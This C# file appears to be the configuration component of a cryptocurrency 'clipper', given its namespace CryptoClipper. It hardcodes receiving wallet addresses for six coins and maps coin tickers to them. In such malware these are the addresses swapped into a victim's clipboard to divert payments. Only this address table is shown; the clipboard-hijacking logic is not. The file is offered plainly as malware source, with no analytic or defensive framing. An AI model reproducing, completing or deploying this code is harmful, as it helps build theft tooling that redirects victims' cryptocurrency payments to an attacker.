namespace CryptoClipper.Config;

public sealed class WalletAddresses
{
    public string Bitcoin { get; set; } = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";
    public string Ethereum { get; set; } = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F";
    public string Monero { get; set; } = "888tNkZrPN6JsEgekjMnABU4TBzc2Dt29EPAvkRxbANsAnjyPbb3iQ1YBRk1UXcdRsiKc9dhwMVgN5S9cQUiyoogDavup3H";
    public string Solana { get; set; } = "DRpbCBMxVnDK7maPM5tGv6MvB3v1sRMC86PZ8okm21hy";
    public string Tron { get; set; } = "TN2TR5eaJJyBmGCvTHrEQgvK3bdMS3RXfn";
    public string Litecoin { get; set; } = "ltc1qw508d6qejxtdg4y5r3zarvary0c5xw7kgmn4n9";

    public Dictionary<string, string> ToDict() => new()
    {
        ["BTC"] = Bitcoin,
        ["ETH"] = Ethereum,
        ["XMR"] = Monero,
        ["SOL"] = Solana,
        ["TRX"] = Tron,
        ["LTC"] = Litecoin
    };
}
